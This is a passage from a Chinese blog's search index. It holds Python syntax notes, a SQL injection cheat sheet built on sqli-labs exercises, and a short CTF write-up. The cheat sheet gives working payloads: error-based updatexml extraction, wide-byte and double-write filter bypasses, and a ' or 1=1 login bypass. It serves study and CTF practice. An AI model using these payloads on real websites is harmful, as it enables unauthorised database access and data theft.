内容不可修改，里面嵌套的list列表可以修改 ，语法和列表基本一致</h5><p>字符串 ：内容不可修改  replace可以替代内容形成一个新的字符串返回值</p><p>集合不支持下表索引，不可会用while循环去遍历</p><p><img src="/2022/10/04/Python%E8%AF%AD%E6%B3%95%E9%80%9F%E9%80%9A/5.png"></p><hr><p>lambda 传入参数：函数体（一行代码）如果不用变量接收，只能每次重写</p><hr><h2 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h2><p>read和readlines 两种方法读取文件内容  readline读取一行内容</p><p>对象.read()：表示全部读取  对象.read（num） ：num表示读取多少字节</p><p>对象.close（）：表示关闭文件</p><p>write后需要flush才能有内容，或者直接close有内置flush的功能        （可以创建文件，但也会覆盖内容）</p><p>a模式不会覆盖原文本内容</p><hr><h2 id="异常认识"><a href="#异常认识" class="headerlink" title="异常认识"></a>异常认识</h2><hr><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>使用格式：</p><p>import time</p><h5 id="request模块库：主要用来发-送-HTTP-请求"><a href="#request模块库：主要用来发-送-HTTP-请求" class="headerlink" title="request模块库：主要用来发 送 HTTP 请求"></a>request模块库：主要用来发 送 HTTP 请求</h5><table><thead><tr><th>delete(<em>url</em>, <em>args</em>)</th><th>发送 DELETE 请求到指定 url</th></tr></thead><tbody><tr><td>get(<em>url</em>, <em>params, args</em>)</td><td>发送 GET 请求到指定 url</td></tr><tr><td>head(<em>url</em>, <em>args</em>)</td><td>发送 HEAD 请求到指定 url</td></tr><tr><td>patch(<em>url</em>, <em>data, args</em>)</td><td>发送 PATCH 请求到指定 url</td></tr><tr><td>post(<em>url</em>, <em>data, json, args</em>)</td><td>发送 POST 请求到指定 url</td></tr><tr><td>put(<em>url</em>, <em>data, args</em>)</td><td>发送 PUT 请求到指定 url</td></tr><tr><td>request(<em>method</em>, <em>url</em>, <em>args</em>)</td><td>向指定的 url 发送指定的请求方法</td></tr></tbody></table><hr><h2 id="可视化图表"><a href="#可视化图表" class="headerlink" title="可视化图表"></a>可视化图表</h2><p>json：带有特定格式的字符串。例子：要么是字典，要么是列表（里面嵌套字典）  用来语言之间转换的中转数据</p><p>使用需要导入：import  json</p><p>先定义一个列表，或者字典，然后用    变量&#x3D;json.dumps(变量名)的格式把列表或者字典转变为json格式</p><p>注意：字典，列表转换的时候里面的元素，字典如果有中文，需要遵循dumps（变量名，ensure_ascii&#x3D;false）的格式确保中文的输出</p><p>json格式转化为列表：变量&#x3D;json.loads（变量名）   来转换</p><hr><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><hr><p>基本语法：class  类名称:</p><p>​类的属性 （定义在类中的变量），即成员变量</p><p>​类的行为 （定义在类中的函数），即成员方法</p><p>创建类的语法：对象&#x3D;类名称（）</p><p>类里面的方法的语法：      def  函数名(self)   self为系统自带，调用方法时可以当self不存在，不用传参数</p><p>   构造函数：两个下划线init两个下划线()方法</p><p>私有成员，变量在类中以两个下划线开头即可。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2022/10/04/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/10/04/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a>SQL注入总结</h1><h3 id="一：-GET-x2F-POST传参注入-：一般情况下有回显"><a href="#一：-GET-x2F-POST传参注入-：一般情况下有回显" class="headerlink" title="一： GET&#x2F;POST传参注入 ：一般情况下有回显"></a>一： GET&#x2F;POST传参注入 ：一般情况下有回显</h3><p>先判断注入类型：?id&#x3D;1 and 1&#x3D;1   看过滤了(,‘,“,等等。</p><p>然后判断列的个数： ?id&#x3D;1’ order by x – a         以引号闭合为例子，x代表数字，来判断列数</p><h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2 报错注入"></a>2 报错注入</h4><p>‘ and updatexml(1,concat(0x7e,(select talbe_schema from informaiton_schema.tables where table_schema&#x3D;’库名’limit 0,1),0x7e)1,) –  a   一般形式的字符类报错注入         0x7e为16进制   的  ~  波浪线符号</p><h4 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3 布尔盲注"></a>3 布尔盲注</h4><p>and length(database())&gt;1</p><h4 id="4-时间盲注"><a href="#4-时间盲注" class="headerlink" title="4 时间盲注"></a>4 时间盲注</h4><h4 id="5-二次注入"><a href="#5-二次注入" class="headerlink" title="5 二次注入"></a>5 二次注入</h4><p>通常看到 PHP MySQL_real_escape_string()函数时，这个函数的作用是用来防止数据库被攻击，可以利用二次注入。</p><p>sqli-labs第25关为例子，admin’#创建这个账号后修改密码，由于单引号闭合后，又加了#，注释了后面的密码，所以修改admin’#的密码相当于直接修改了admin的密码，从而得到flag，实现二次注入</p><h4 id="6-宽字节注入：页面和后台的编码不同而产生的漏洞"><a href="#6-宽字节注入：页面和后台的编码不同而产生的漏洞" class="headerlink" title="6 宽字节注入：页面和后台的编码不同而产生的漏洞"></a>6 宽字节注入：页面和后台的编码不同而产生的漏洞</h4><p>‘单引号被过滤了，用%df’来拼接成汉字即可绕过(适用于GET传参时)</p><p>在POST传参时，用bs修改hex文件来达到目的 例如sqli-labs 第34关</p><p>当然，一些汉字（例如：汉）为3个字节时，2个字节一组可以与转义符\相匹配代替%df，从而使转义符失效</p><h4 id="7-堆叠注入：可以使用多个SQL语句，多个查询用分号隔开，这就是产生堆叠注入的原因"><a href="#7-堆叠注入：可以使用多个SQL语句，多个查询用分号隔开，这就是产生堆叠注入的原因" class="headerlink" title="7 堆叠注入：可以使用多个SQL语句，多个查询用分号隔开，这就是产生堆叠注入的原因"></a>7 堆叠注入：可以使用多个SQL语句，多个查询用分号隔开，这就是产生堆叠注入的原因</h4><p>原理看到函数：Mysqli_multi_query()函数时，可以想到堆叠注入</p><h3 id="二-：当存在过滤时，存在的过滤方式"><a href="#二-：当存在过滤时，存在的过滤方式" class="headerlink" title="二 ：当存在过滤时，存在的过滤方式"></a>二 ：当存在过滤时，存在的过滤方式</h3><p><strong>1</strong>   如果过滤了 –  a  和#  注释方式不管用  可以在注释原来的地方替换为      or  ‘1’&#x3D;’1   来进行闭合，实行SQL注入</p><p>例如：preg_replace()函数则为过滤用。一般替换（不能用的字符）为空    。在这个函数中加&#x2F;i表示大小写都没法用</p><p><strong>2</strong> 如果过滤了 and 和 or，无法连接代码，可以用&amp;&amp;替换and，||替换or</p><p>注意：&amp;&amp;使用需要用url编码：%26%26。不编码的话当作多参数传参，无法生效。</p><p>sqli-labs第25关为例子  ，最后需要用information的库，但or会被替换为空，爆出来的结果为infmation，无法爆出所需要的表。所以这里可以采用双写绕过，在报错注入语句里写 from infoorrmation_schema  即可。</p><p><strong>3</strong> 过滤\s ：表示不能有空白      空格可以用%0a或者%a0来替换试试，也可以用select 后面多加个括号()来替换</p><p>例如sqli-labs第26关：payload为： ?id&#x3D;1’||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;’security’))),1))||’0</p><p><strong>4</strong> 当union和select也被过滤时。先看是不是所有的大小写都被过滤，如果只是单独的，可以用selEct和uniOn来替换。</p><p>注意：查表的时候的单引号用database()函数代替，表名可以用十六进制来替代，因为MySQL支持16进制的表达。</p><h3 id="三-：基于burp-suite修改请求头来进行注入"><a href="#三-：基于burp-suite修改请求头来进行注入" class="headerlink" title="三 ：基于burp suite修改请求头来进行注入"></a>三 ：基于burp suite修改请求头来进行注入</h3><p>1 基于reference</p><p>2 基于cookie</p><p>3 基于X-forward</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUCCTF web</title>
      <link href="/2022/10/02/BUCCTF-web/"/>
      <url>/2022/10/02/BUCCTF-web/</url>
      
        <content type="html"><![CDATA[<hr><hr><h1 id="web-wp"><a href="#web-wp" class="headerlink" title="web wp"></a>web wp</h1><blockquote><p><img src="/2022/10/02/BUCCTF-web/EasySQL.png"></p></blockquote><p>根据题意，简单的SQL，进入界面，发现是一个简单的登录界面，所以随便输一个用户名：admin，密码用万能的： ‘ or 1&#x3D;1 ,flag就出来了</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
